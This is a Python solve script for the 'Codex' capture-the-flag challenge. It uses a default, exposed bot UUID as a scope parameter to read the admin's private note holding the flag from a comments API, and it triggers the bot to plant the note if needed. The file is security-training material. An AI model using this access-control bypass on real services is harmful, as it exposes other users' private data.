#!/usr/bin/env python3
"""CTFCUP Codex: read the bot's planted private note.

Usage: python3 solve_codex.py https://INSTANCE.instances.ctfcup.online
Dependencies: pip install requests
"""
import argparse
import re
import sys
import requests

BOT_UUID = 'cccccccc-cccc-4ccc-8ccc-cccccccccccc'  # bot.js default


def get_flag(s, base, uuid):
    url = f'{base}/api/comments'
    r = s.get(url, params={'page': 'matthew.7', 'scope': uuid}, timeout=12)
    r.raise_for_status()
    notes = r.json()
    if not isinstance(notes, list):
        raise ValueError(f'Unexpected server response: {notes!r}')
    for c in notes:
        if c.get('author') == 'admin' and c.get('page') == 'matthew.7' and c.get('scope') == uuid:
            return c['text']
    return None


def main():
    p = argparse.ArgumentParser(description='Extract Codex CTF flag using the exposed bot UUID')
    p.add_argument('url', help='CTF challenge instance URL')
    p.add_argument('--uuid', default=BOT_UUID, help='Bot UUID, if changed by deployment')
    args = p.parse_args()
    base = args.url.rstrip('/')
    with requests.Session() as s:
        try:
            flag = get_flag(s, base, args.uuid)
            if not flag:
                print('[*] Flag note not present; asking bot to plant it...')
                try:
                    r = s.post(base + '/api/visit', json={'url': base + '/' + args.uuid}, timeout=45)
                    print(f'[*] Bot response HTTP {r.status_code}: {r.text[:400]}')
                except requests.RequestException as e:
                    print(f'[!] Bot request error: {e}', file=sys.stderr)
                flag = get_flag(s, base, args.uuid)
            if flag:
                print(f'[+] FLAG: {flag}')
                return 0
            print('[!] No admin flag in this scope. The instance may override BOT_UUID.')
            print(f'[*] Checked: {base}/api/comments?page=matthew.7&scope={args.uuid}')
            return 1
        except (requests.RequestException, ValueError, KeyError) as e:
            print(f'[!] Error: {e}', file=sys.stderr)
            return 2


if __name__ == '__main__':
    sys.exit(main())
